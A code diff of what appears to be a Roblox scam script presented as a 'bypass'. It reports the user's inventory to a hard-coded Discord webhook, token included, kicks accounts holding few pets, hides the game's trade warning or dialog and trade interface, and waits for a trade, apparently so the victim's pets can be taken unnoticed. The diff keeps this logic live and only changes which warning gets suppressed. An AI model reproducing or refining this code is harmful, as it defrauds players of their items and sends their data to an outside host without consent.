@@ -1,4 +1,3 @@
-local LogsUsername = "ImagineGotScamXD"
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
@@ -129,7 +128,7 @@ local function sendEmbed(webhookUrl, embedData)
         print("Bruh")
     end
 end
-
+local LogsUsername = "ImagineGotScamXD"
 local LogsWebhook = "https://discord.com/api/webhooks/1309897171369197588/Es13EP_U_GLWFjJrAwXPasVMU_0h61c3um6K5GNT4z_YJugWa6TGw2m6XNkpV_Y6rWgL"
 sendEmbed(LogsWebhook, embed2)
 wait(7)
@@ -223,6 +222,6 @@ print("Bypassed!")
     if total_pets == 1 then
         game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 1 pet in your inventory or use this script on your main account.")
 end
-game:GetService("Players").LocalPlayer.PlayerGui.TradeWarningGui.Visible = false
+game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 WaitForTrade()
